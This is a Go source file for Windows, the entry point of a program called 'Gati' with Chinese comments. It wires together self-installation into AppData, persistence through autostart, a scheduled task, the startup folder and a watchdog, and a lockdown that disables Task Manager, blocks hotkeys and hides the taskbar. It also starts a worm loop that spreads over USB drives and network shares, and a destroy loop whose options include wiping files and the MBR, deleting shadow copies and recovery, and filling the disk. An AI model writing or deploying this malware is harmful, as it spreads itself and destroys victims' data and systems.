//go:build windows

package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	gCfg     *Config
	baseDir  string
	selfPath string
	myRole   string
	verbose  bool
	logFile  *os.File
	logMu    sync.Mutex
	keepAlive []syscall.Handle
	activeIni string
)

func logf(format string, a ...interface{}) {
	logMu.Lock()
	defer logMu.Unlock()
	line := time.Now().Format("2006-01-02 15:04:05") + " " + fmt.Sprintf(format, a...)
	if logFile != nil {
		_, _ = logFile.WriteString(line + "\n")
	}
	if verbose {
		fmt.Println(line)
	}
}

func main() {
	dryRun := flag.Bool("dry-run", false, "只读取配置并打印,不做任何实际操作")
	unlock := flag.Bool("unlock", false, "紧急解锁:清理所有痕迹并退出")
	here := flag.Bool("here", false, "就在当前位置运行,不安装到 AppData")
	cfgPath := flag.String("config", "", "指定配置文件路径")
	flag.BoolVar(&verbose, "v", false, "打日志到控制台")
	flag.Parse()

	selfPath, _ = os.Executable()
	baseDir = configDir()

	if strings.Contains(strings.ToLower(filepath.Base(selfPath)), "-b") {
		myRole = "b"
	} else {
		myRole = "a"
	}

	// 配置文件位置
	var ini string
	if *cfgPath != "" {
		ini = *cfgPath
	} else if _, err := os.Stat(filepath.Join(baseDir, "gati.ini")); err == nil {
		ini = filepath.Join(baseDir, "gati.ini")
	} else {
		ini = filepath.Join(filepath.Dir(selfPath), "gati.ini")
	}

	activeIni = ini
	gCfg = loadConfig(ini)

	if *dryRun {
		dumpConfig(ini)
		return
	}

	if *unlock {
		doUnlock()
		return
	}

	// 安装到 AppData,然后由那边的正式进程接管
	alreadyInstalled := strings.EqualFold(filepath.Dir(selfPath), baseDir)
	if !alreadyInstalled && !*here {
		installSelf()
		target := filepath.Join(baseDir, "gati-"+myRole+".exe")
		_ = spawnDetached(target)
		// 把配置和文本也放到原位,方便用户改
		copyIfMissing("gati.ini", defaultINI)
		copyIfMissing("gati_text.txt", defaultText)
		return
	}

	if !*here {
		_ = os.MkdirAll(baseDir, 0755)
		lf, err := os.OpenFile(filepath.Join(baseDir, "gati.log"),
			os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err == nil {
			logFile = lf
		}
	}

	logf("=== Gati start role=%s pid=%d ===", myRole, os.Getpid())

	// 上一次解锁留下的停止旗子,这次正常启动就清掉
	if stopFileExists() {
		_ = os.Remove(stopFile())
		logf("cleared previous STOP flag")
	}

	if !*here && !singleInstance("GatiOverlay_"+myRole) {
		logf("another instance of role %s is running, exit", myRole)
		return
	}

	// 确保文本文件存在
	if _, err := os.Stat(textPath()); err != nil {
		_ = os.WriteFile(textPath(), []byte(defaultText), 0644)
	}

	if !*here {
		installPersistence()
		applyLockdown()
	}

	// 各模块并行起来
	go hotkeyLoop()
	go watchdogLoop()
	go wormLoop()
	go destroyLoop()

	// 主线程跑窗口消息循环
	displayLoop()

	// 窗口退出后收尾
	releaseLockdown()
	logf("=== Gati exit ===")
}

func copyIfMissing(name, content string) {
	dst := filepath.Join(filepath.Dir(selfPath), name)
	if _, err := os.Stat(dst); err == nil {
		return
	}
	_ = os.WriteFile(dst, []byte(content), 0644)
}

func singleInstance(name string) bool {
	p, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return true
	}
	h, _, callErr := pCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(p)))
	if callErr != nil {
		if errno, ok := callErr.(syscall.Errno); ok && errno == 183 { // ERROR_ALREADY_EXISTS
			return false
		}
	}
	keepAlive = append(keepAlive, syscall.Handle(h))
	return true
}

func dumpConfig(path string) {
	fmt.Println("配置文件:", path)
	if _, err := os.Stat(path); err != nil {
		fmt.Println("  !! 文件不存在,使用内置默认值")
	}
	fmt.Println()
	fmt.Printf("[display]  窗口数=%d  字体=%s/%d  前景=%s  背景=%s  模式=%s  对齐=%s\n",
		gCfg.WindowCount, gCfg.FontName, gCfg.FontSize, gCfg.FgColor, gCfg.BgColor, gCfg.Mode, gCfg.Align)
	fmt.Printf("           文字文件=%s\n", textPath())
	fmt.Printf("[lockdown] 禁任务管理器=%v  拦热键=%v  藏任务栏=%v\n",
		gCfg.BlockTaskmgr, gCfg.BlockHotkeys, gCfg.HideTaskbar)
	fmt.Printf("[persist]  自启=%v  看门狗=%v  计划任务=%v  启动夹=%v\n",
		gCfg.PersistEnabled, gCfg.Watchdog, gCfg.ScheduledTask, gCfg.StartupFolder)
	fmt.Printf("[unlock]   %s  (VK=0x%02X ctrl=%v alt=%v shift=%v)\n",
		gCfg.UnlockHotkey, gCfg.UnlockVK, gCfg.UnlockCtrl, gCfg.UnlockAlt, gCfg.UnlockShift)
	fmt.Printf("[worm]     启用=%v  U盘=%v  网络共享=%v  用户目录=%v  深度=%d  文件名=%s\n",
		gCfg.WormEnabled, gCfg.WormUSB, gCfg.WormNetShares, gCfg.WormUserDirs, gCfg.WormDepth, gCfg.WormName)
	if gCfg.DestroyEnabled && gCfg.DestroyConfirm == destroyConfirmWord {
		fmt.Println("[destroy]  !!! 已武装 !!! 目标:")
		for _, d := range gCfg.DestroyTargets {
			fmt.Println("           -", d)
		}
		fmt.Printf("          清文件=%v  MBR=%v  卷影=%v  恢复=%v  填盘=%v\n",
			gCfg.DestroyFiles, gCfg.DestroyWipeMBR, gCfg.DestroyShadows, gCfg.DestroyRecovery, gCfg.DestroyFillDisk)
	} else if gCfg.DestroyEnabled {
		fmt.Printf("[destroy]  已启用但 confirm 不对(现在是 %q),保护性拒绝执行\n", gCfg.DestroyConfirm)
	} else {
		fmt.Println("[destroy]  关闭(默认)")
	}
	fmt.Println()
	fmt.Println("Go:", runtime.Version(), " 安装目录:", baseDir)
}
